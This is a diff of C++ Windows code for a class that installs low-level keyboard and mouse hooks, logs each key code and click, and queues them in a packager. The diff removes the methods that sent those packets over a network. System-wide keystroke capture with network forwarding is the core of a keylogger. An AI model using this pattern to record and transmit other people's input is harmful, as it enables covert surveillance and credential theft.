@@ -55,50 +55,23 @@ void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMou
 				_previousPoint.x = mouseStruct->pt.x;
 				_previousPoint.y = mouseStruct->pt.y;
 				std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
-				_packager.addClick(nCode, wParam, lParam);
+				_packager->addClick(nCode, wParam, lParam);
 			}
 		}
 		else {
 			std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
-			_packager.addClick(nCode, wParam, lParam);	// MOUSEINPUT
+			_packager->addClick(nCode, wParam, lParam);	// MOUSEINPUT
 		}
 	}
 	else {
 		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
-		_packager.addKey(nCode, wParam, lParam);
-	}
-	sendPaquet();
-}
-
-void Hooker::sendPaquet() {
-	bool paquetSent = true;
-
-	// TODO: check if network is reachable
-	while (_packager.isLeft() && paquetSent && _network) {
-		_network->writePaquet(*_packager.getPaquet());
-		_packager.supprPaquet();
+		_packager->addKey(nCode, wParam, lParam);
 	}
 }
 
-bool Hooker::connect() {
-	if (_network)
-		_network->initNetwork();
-	return true;
+void Hooker::setPackager(Packager* packager) {
+	_packager = packager;
 }
-
-bool& Hooker::isConnected() {
-	return _connected;
-}
-
-void Hooker::setNetwork(Network* network) {
-	_network = network;
-	connect();
-}
-
-Network& Hooker::getNetwork() const {
-	return *_network;
-}
-
 
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
